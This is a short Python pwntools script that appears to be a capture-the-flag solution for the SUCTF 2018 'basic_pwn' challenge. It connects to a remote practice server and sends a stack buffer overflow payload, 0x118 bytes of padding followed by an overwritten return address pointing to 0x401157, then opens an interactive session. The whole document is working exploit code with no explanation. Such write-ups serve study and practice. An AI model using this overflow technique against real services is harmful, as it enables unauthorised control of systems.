from pwn import *

pn = './SUCTF_2018_basic_pwn'
#p = process(pn)
p = remote('node4.buuoj.cn', 28429)

bk = 0x401157

payload = b'a' * ( 0x110 + 8 ) + p64(bk)

p.sendline(payload)

p.interactive()